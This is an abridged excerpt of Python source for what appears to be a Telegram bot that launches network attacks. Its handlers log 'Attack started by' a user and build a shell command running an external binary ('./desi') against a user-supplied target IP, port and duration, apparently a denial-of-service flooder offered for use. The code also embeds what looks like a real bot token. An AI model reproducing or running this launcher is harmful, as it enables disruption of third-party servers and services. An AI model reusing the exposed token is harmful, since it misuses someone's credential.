...
TOKEN = '7759986591:AAEGC2XtOqRr5dSa1HsMVFjQaQaaBwHN7b0'  # Replace with your actual bot token
...
def handle_photo(message):
    ...
    bot.send_message(
        message.chat.id,
        f"✅ 𝙃𝙞 📸 𝙁𝙀𝙀𝘿𝘽𝙖𝘾𝙆 𝙍𝙚𝘾𝙀𝙄𝙑𝙚𝘿 𝙁𝙍𝙤𝙈 𝙐𝙎𝙚𝙍 :- @{username} ✅"
    )
...
def TF_command(message):
    ...
    try:
        ...
        logging.info(f"Attack started by {user_name}: ./desi {target_ip} {target_port} {default_duration} 877")
...
async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
    try:
        command = f"./desi {target_ip} {target_port} {duration} 877"
